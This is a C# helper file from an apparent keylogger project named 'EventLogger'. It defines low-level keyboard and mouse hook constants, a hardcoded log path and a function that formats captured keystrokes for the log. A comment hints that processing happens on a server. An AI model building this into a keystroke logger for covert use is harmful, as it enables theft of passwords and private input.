using System.Configuration.Internal;
using System.Diagnostics;

namespace EventLogger;

public static class Utils
{
    public const int WH_KEYBOARD_LL = 13;
    public const int WH_MOUSE_LL = 14;
    public const int WM_KEYDOWN = 0x0100;
    public const int WM_KEYUP = 0x0101;
    public const int WM_LBUTTONDOWN = 0x0201;
    public const int WM_RBUTTONDOWN = 0x0204;
    public const String PATH = @"C:\Users\nicof\Desktop\PROJECTS\logger\log.txt";
    public static String TransformInt(int i) {
        // function that transforms the int and return the string that will be written in the log file
        // the function is called when the user press a key
        String key = ((Keys) i).ToString();
        if (key.Length == 1)
        {
            key = ((char) (i + 32)).ToString();
        }
        else
        {
            // the key is a special key
            key = "[" + key + "]";
        }

        return key;
        // optimized on server side
        //switch (key)
        //{
        //    case "LControlKey":
        //    case "RControlKey":
        //        key = "[Ctrl]";
        //        break;
        //    case "LShiftKey":
        //    case "RShiftKey":
        //        key = "[Shift]";
        //        break;
        //    case "LMenu":
        //    case "RMenu":
        //        key = "[Alt]";
        //        break;
        //    case "LWin":
        //    case "RWin":
        //        key = "[Win]";
        //        break;
        //    case "Back":
        //        key = "[Backspace]";
        //        break;
        //    case "Return":
        //        key = "[Enter]";
        //        break;
        //    case "Escape":
        //        key = "[Esc]";
        //        break;
        //    default:
        //        // action key is pressed
        //        key = "[" + key + "]";
        //        break;
        //}
    }

}